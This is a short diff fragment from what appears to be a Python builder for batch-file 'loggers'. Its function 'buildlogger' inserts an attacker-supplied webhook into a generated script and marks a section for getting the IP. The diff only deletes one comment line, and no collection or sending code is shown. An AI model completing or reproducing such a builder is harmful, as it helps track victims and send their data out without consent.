@@ -67,7 +67,6 @@ async def main():
         
 def buildlogger(wb):
     code = f"""@echo off
-:: WEBHOOK
 set webhook={wb}
 
 :: GETTING THE IP
